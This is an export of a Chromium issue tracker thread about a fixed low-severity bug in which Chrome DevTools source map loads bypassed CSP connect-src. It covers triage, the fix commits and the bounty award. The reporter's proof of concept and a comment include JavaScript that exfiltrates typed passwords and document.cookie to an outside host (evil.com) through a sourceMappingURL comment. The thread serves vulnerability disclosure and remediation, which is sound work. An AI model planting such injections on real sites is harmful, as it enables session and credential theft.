# CSP doesn't block sourceMappingURL

| Field | Value |
|-------|-------|
| **Issue ID** | [361116749](https://issues.chromium.org/issues/361116749) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>DevTools>Sources |
| **Platforms** | Linux, ChromeOS |
| **Reporter** | no...@applitools.com |
| **Assignee** | da...@google.com |
| **Created** | 2024-08-20 |
| **Bounty** | $1,000.00 |

## Description

# VULNERABILITY DETAILS

The vulnerability allows source maps from unauthorized domains to be loaded despite Content Security Policy restrictions, potentially exposing sensitive information.

# VERSION

- Chrome Version: 127.0.6533.99 (Official Build) snap (64-bit) stable
- Operating System: Ubuntu 24.04 LTS (Codename: noble)

# REPRODUCTION CASE

1. tested on node (20.16.0) npm (10.8.1) and express (4.19.2)
2. save the code below as `server.js`
3. execute node server.js
4. go to `http://localhost:3007/`
5. enter a secret phrase to the password field
6. open the devtool

## expected behavior:

The browser should not make any cross-origin requests. The source map should not be loaded, and an error message should appear in the console.

## actual behavior:

The browser transmit the secret passphrase to a third party once the developers tool is opened.

```
import express from 'express'

const app = express()
const app2 = express()

app.get('/', (req, res) => {
    console.log('index requested')
    res.send(`
        <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline';connect-src 'self';">
        <input type="password" onkeyup="f(this.value)"/>
        <script>
            function f(val) {
                document.getElementsByTagName('style')[0].innerHTML = \`
                    /*# sourceMappingURL=http://localhost:3008/styles.css.map/\${val} */
                \`
            }
        </script>
        <style></style>
    `)
})

app2.get('/styles.css.map/:id', (req, res) => {
    console.log(req.params.id, 'requested')
    res.send(``)
})

app.listen(3007, () => console.log('Server is running on port 3007'))
app2.listen(3008, () => console.log('Server is running on port 3008'))

```
# CREDIT INFORMATION

Reporter credit: Noam Gaash

## Timeline

### jd...@chromium.org (2024-08-20)

noam.gaash@: Thanks for the report. Have you verified that this reproduces when neither the top-frame nor the target map server are localhost?

szuend@: I think you work on source maps in devtools -- would you take a look at this, or help me find a better owner?

Assuming this repros across sites other than localhost, I consider this a S3 (low severity). A lot of stars have to align for this to be impactful. A victim site has to use source maps, and reveal private content through them (e.g. static maps wouldn't work), and then the victim user has to open devtools. But I think that's still an issue, if only a minor one.

If you need one or both URLs to be localhost, I'm comfortable not calling this a security bug at all.

### no...@applitools.com (2024-08-21)

Thank you for reviewing this issue.

I see this as a security concern because it can be exploited in the context of XSS attacks. As a web developer, I expect that even in the worst-case scenario where an adversary successfully injects malicious JavaScript into my website, they shouldn’t be able to exfiltrate sensitive information, such as cookies and passwords, because the browser should block connections to the attacker's servers.

However, if the attacker injects something like:

```
document.getElementsByTagName('style')[0].innerHTML = `
     /*# sourceMappingURL=http://evil.com/${document.cookie} */
`

```

They could potentially gain full access to my session when I open the DevTools. This is particularly concerning since most developers frequently use Chrome's DevTools to inspect issues on their production websites.

Additionally, since this request is not visible in the network tab, developers may never realize that their websites have been compromised.

I tested it outside localhost - I visited <https://google.com>, and executed the following script inside the DevTool console:

```
document.getElementsByTagName('style')[0].innerHTML = `
     /*# sourceMappingURL=http://127.0.0.1:3008/styles.css.map/${escape(document.cookie.substring(0, 20))} */
`

```

and it reported the prefix of `document.cookie` to the server.

### pe...@google.com (2024-08-22)

Setting Priority to P2 to match Severity s3. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### pe...@google.com (2024-09-24)

This Chrome DevTools issue has `Found In` milestone information, but is still on the Unconfirmed hotlist. Assuming that this issue is therefore considered confirmed, please provide any additional information that is still missing and remove it from the Unconfirmed hotlist so that it can be further triaged by the product team.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### pe...@google.com (2024-09-30)

This Chrome DevTools issue has `Found In` milestone information, but is still on the Unconfirmed hotlist. Assuming that this issue is therefore considered confirmed, please provide any additional information that is still missing and remove it from the Unconfirmed hotlist so that it can be further triaged by the product team.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### dx...@google.com (2025-07-04)

Project: chromium/src  

Branch: main  

Author: Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6667844>

Implement `connect-src` check for `Network.loadNetworkResource`

---


Expand for full commit details

```Implement `connect-src` check for `Network.loadNetworkResource`

```
Without this check source map requests bypass, potentially allowing data exfiltration. 
 
Bug: 361116749 
Change-Id: I3dcc3e089d4a228cc953c11d7155147bb5c2f6e0 
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6667844 
Auto-Submit: Danil Somsikov <dsv@chromium.org> 
Commit-Queue: Danil Somsikov <dsv@chromium.org> 
Reviewed-by: Andrey Kosyakov <caseq@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#1482495}

```
```

---

Files:
* M       `content/browser/devtools/protocol/network_handler.cc`
* A       `third_party/blink/web_tests/http/tests/inspector-protocol/network/load-network-resource-csp-expected.txt`
* A       `third_party/blink/web_tests/http/tests/inspector-protocol/network/load-network-resource-csp.js`
* A       `third_party/blink/web_tests/http/tests/inspector-protocol/network/resources/page-with-csp.php`

---

Hash: fe72006efbce74a7a7133287a6688cc4f4bec87b\
Date:&nbsp; Fri Jul 4 08:48:54 2025

</details>

---

```

### dx...@google.com (2025-07-04)

Project: devtools/devtools-frontend  

Branch: main  

Author: Danil Somsikov [dsv@chromium.org](mailto:dsv@chromium.org)  

Link:      <https://chromium-review.googlesource.com/6667889>

Do not fallback when source map load failed due to a CSP error.

---


Expand for full commit details
```
     
    Bug: 361116749 
    Change-Id: I843ac13b7d605f76546eb6e673e17ef9cbeaaea0 
    Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/6667889 
    Commit-Queue: Danil Somsikov <dsv@chromium.org> 
    Auto-Submit: Danil Somsikov <dsv@chromium.org> 
    Reviewed-by: Simon Zünd <szuend@chromium.org>

```

---

Files:

- M `front_end/core/sdk/PageResourceLoader.ts`

---

Hash: 5c8833cfccc90880d3dc648b64cc6786a48a2d0e  

Date:  Fri Jul 4 09:18:27 2025


---

### dx...@google.com (2025-07-04)

Project: chromium/src  

Branch: main  

Author: chromium-autoroll [chromium-autoroll@skia-public.iam.gserviceaccount.com](mailto:chromium-autoroll@skia-public.iam.gserviceaccount.com)  

Link:      <https://chromium-review.googlesource.com/6705311>

Roll DevTools Frontend from d09ac21d4592 to 4e6e12700ef7 (2 revisions)

---


Expand for full commit details
```
     
    https://chromium.googlesource.com/devtools/devtools-frontend.git/+log/d09ac21d4592..4e6e12700ef7 
     
    2025-07-04 mathias@chromium.org Correct iPad device emulation metadata 
    2025-07-04 dsv@chromium.org Do not fallback when source map load failed due to a CSP error. 
     
    If this roll has caused a breakage, revert this CL and stop the roller 
    using the controls here: 
    https://autoroll.skia.org/r/devtools-frontend-chromium 
    Please CC liviurau@google.com on the revert to ensure that a human 
    is aware of the problem. 
     
    To report a problem with the AutoRoller itself, please file a bug: 
    https://issues.skia.org/issues/new?component=1389291&template=1850622 
     
    Documentation for the AutoRoller is here: 
    https://skia.googlesource.com/buildbot/+doc/main/autoroll/README.md 
     
    Bug: chromium:361116749,chromium:428922157 
    Change-Id: I3daed008c677df05b8e845bb7fd22c8093973d45 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6705311 
    Bot-Commit: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Commit-Queue: chromium-autoroll <chromium-autoroll@skia-public.iam.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#1482543}

```

---

Files:

- M `DEPS`
- M `third_party/devtools-frontend/src`

---

Hash: 2d4ef010b7dd8e13e7f292698d60b0802777efec  

Date:  Fri Jul 4 11:30:38 2025


---

### ch...@google.com (2025-07-28)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ch...@google.com (2025-07-28)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: `https://<host>-review.googlesource.com/c/<repo>/+/<change_number>` or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### sp...@google.com (2025-08-28)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
report of lower impact exploitation mitigation bypass, mitigated due to preconditions of lack of remote exploitability and user interaction


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2025-11-04)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### we...@gmail.com (2025-11-04)

Hi folks.

While I'm happy for Noam's finding, I can't help but feel frustrated given I disclosed this bug to the project 6 years ago and was waved off.

In fact, I disclosed more disturbing details regarding SourceMappingURL behavior, but was told this isn't considered a security vulnerability.

Some resources to back up this claim:

1. Original post was published in 2019 by me <https://web.archive.org/web/20200724161730/https://medium.com/@weizmangal/javascript-anti-debugging-some-next-level-sh-t-part-1-abusing-sourcemappingurl-da91ff948e66>
2. Here's the issue report I submitted back then <https://bugs.chromium.org/p/chromium/issues/detail?id=988267> (I no longer have access to it, probably because it was reported via my old work email which was `gal@perimeterx.com` back then)

I believe my report should be acknowledged and accepted just as well as this one, but since it was reported 6 years ago, I feel funny asking for a bounty, so I'd love for you to double another 1k and donate it as well.

Would appreciate your response on this, thanks.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/361116749)*
